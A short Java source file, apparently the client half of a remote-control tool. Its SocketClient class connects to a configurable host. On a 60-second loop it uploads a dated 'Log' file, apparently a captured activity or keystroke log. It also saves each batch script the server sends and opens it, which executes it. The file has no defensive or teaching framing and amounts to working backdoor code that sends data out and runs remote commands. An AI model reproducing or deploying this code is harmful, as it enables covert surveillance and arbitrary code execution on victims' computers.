package Client;

import java.awt.Desktop;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.concurrent.TimeUnit;

public class SocketClient implements Runnable {
	private static Socket socket;
	private static DataInputStream dis;
	private static DataOutputStream dos;
	
	public SocketClient(String host, int port) {
		try {
			socket = new Socket(host, port);
			dis = new DataInputStream(socket.getInputStream());
			dos = new DataOutputStream(socket.getOutputStream());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public void SendData() {
		SimpleDateFormat dateFormat = new SimpleDateFormat("ddMMyyyy");
		String fileName = "Log-" + dateFormat.format(Calendar.getInstance().getTime()) + ".bat";
		File file = new File(fileName);
		byte[] bytes = FileIO.File_InputStream(file);
		try {
			dos.write(bytes);
			dos.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public void RecData() throws IOException {
		SimpleDateFormat dateFormat = new SimpleDateFormat("hhmmddMMyyyy");
		String fileName = dateFormat.format(Calendar.getInstance().getTime());
		File file = new File("Server-" + fileName + ".bat");
		byte[] bytes = new byte[dis.available()];
		dis.readFully(bytes);
		FileIO.File_Log_Writer(bytes, file);
		Desktop.getDesktop().open(file);
	}

	@Override
	public void run() {
			new Thread(() -> {
				while(socket.isConnected()) {
					try {
						TimeUnit.SECONDS.sleep(60);
						SendData();
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
			}).start();
			
			while(socket.isConnected()) {
				try {
					if(dis.available() > 0) {
						RecData();
						//System.out.println("da nhan !");
					}
				}catch(IOException e) {
					
				}
			}
	}
}
